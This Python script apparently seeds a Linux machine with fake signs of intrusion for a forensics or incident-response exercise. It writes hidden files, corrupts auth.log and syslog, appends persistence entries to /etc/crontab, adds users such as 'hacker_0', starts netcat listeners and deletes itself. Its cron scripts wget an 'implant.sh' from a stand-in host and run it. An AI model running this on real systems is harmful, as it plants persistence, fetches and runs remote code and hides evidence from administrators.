import os
import subprocess
from datetime import datetime
import random

def create_suspicious_files():
    suspicious_files = [
        f"/tmp/.hidden_file_{i}" for i in range(25)
    ] + [
        f"/var/tmp/.hidden_var_file_{i}" for i in range(25)
    ] + [
        f"/home/cdo/suspicious_file_{i}" for i in range(25)
    ] + [
        f"/home/cdo/.hidden_file_{i}" for i in range(25)
    ]

    for file in suspicious_files:
        with open(file, 'w') as f:
            f.write("Suspicious content")

def create_suspicious_directories():
    suspicious_directories = [
        f"/tmp/.hidden_directory_{i}" for i in range(10)
    ] + [
        f"/var/tmp/.hidden_var_directory_{i}" for i in range(10)
    ] + [
        f"/home/cdo/.config_{i}" for i in range(10)
    ] + [
        f"/root/.config_{i}" for i in range(10)
    ] + [
        f"/home/cdo/suspicious_dir_{i}" for i in range(10)
    ] + [
        f"/root/suspicious_dir_{i}" for i in range(10)
    ]

    for directory in suspicious_directories:
        os.makedirs(directory, exist_ok=True)

def modify_logs():
    logs = [
        "/var/log/auth.log",
        "/var/log/syslog"
    ]

    for log in logs:
        for i in range(50):
            with open(log, 'a') as f:
                f.write(f"{datetime.now()} - Suspicious log entry {i}\n")

def create_cron_jobs():
    cron_jobs = [
        f"* * * * * /tmp/.hidden_script_{i}.sh" for i in range(12)
    ] + [
        f"@reboot /var/tmp/.hidden_var_script_{i}.sh" for i in range(12)
    ]

    with open("/etc/crontab", 'a') as f:
        for job in cron_jobs:
            f.write(f"{job}\n")

    for i in range(12):
        with open(f"/tmp/.hidden_script_{i}.sh", 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"echo 'Malicious script {i} executed' > /tmp/malicious_{i}.log\n")
            f.write(f"mkdir -p /tmp/.malicious_activity_{i}\n")
            f.write(f"wget -O /tmp/.malicious_activity_{i}/implant.sh http://example.com/implant.sh\n")
            f.write(f"chmod +x /tmp/.malicious_activity_{i}/implant.sh\n")
            f.write(f"/tmp/.malicious_activity_{i}/implant.sh\n")
            f.write(f"rm -rf /tmp/malicious_{i}\n")

        with open(f"/var/tmp/.hidden_var_script_{i}.sh", 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"echo 'Malicious script {i} executed at reboot' > /var/tmp/malicious_{i}.log\n")
            f.write(f"mkdir -p /var/tmp/.malicious_activity_{i}\n")
            f.write(f"wget -O /var/tmp/.malicious_activity_{i}/implant.sh http://example.com/implant.sh\n")
            f.write(f"chmod +x /var/tmp/.malicious_activity_{i}/implant.sh\n")
            f.write(f"/var/tmp/.malicious_activity_{i}/implant.sh\n")
            f.write(f"rm -rf /var/tmp/malicious_{i}\n")

        subprocess.run(["chmod", "+x", f"/tmp/.hidden_script_{i}.sh"])
        subprocess.run(["chmod", "+x", f"/var/tmp/.hidden_var_script_{i}.sh"])

def create_network_activity():
    for i in range(5):
        with open(f"/tmp/.hidden_netcat_{i}.sh", 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"echo 'Simulated network listener {i} running' > /tmp/netcat_{i}.log\n")
            f.write(f"while true; do nc -l -p {12345 + i}; done\n")

        subprocess.run(["chmod", "+x", f"/tmp/.hidden_netcat_{i}.sh"])
        subprocess.Popen([f"/tmp/.hidden_netcat_{i}.sh"])

    for i in range(5):
        with open(f"/tmp/.hidden_netcat_ping_{i}.sh", 'w') as f:
            f.write("#!/bin/bash\n")
            f.write(f"echo 'Simulated network listener with ping {i} running' > /tmp/netcat_ping_{i}.log\n")
            f.write(f"while true; do nc -l -p {12400 + i} & ping -c 4 {random_ip()}; done\n")

        subprocess.run(["chmod", "+x", f"/tmp/.hidden_netcat_ping_{i}.sh"])
        subprocess.Popen([f"/tmp/.hidden_netcat_ping_{i}.sh"])

def random_ip():
    return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))

def create_suspicious_users():
    users = [f"eviladmin_{i}" for i in range(5)] + [f"hacker_{i}" for i in range(5)] + [f"intruder_{i}" for i in range(5)]
    for user in users:
        try:
            subprocess.run(["sudo", "useradd", "-m", "-s", "/bin/bash", user])
        except Exception as e:
            print(f"Failed to create user {user}: {e}")

if __name__ == "__main__":
    create_suspicious_files()
    create_suspicious_directories()
    modify_logs()
    create_cron_jobs()
    create_network_activity()
    create_suspicious_users()

    # Remove the script itself
    os.remove(__file__)
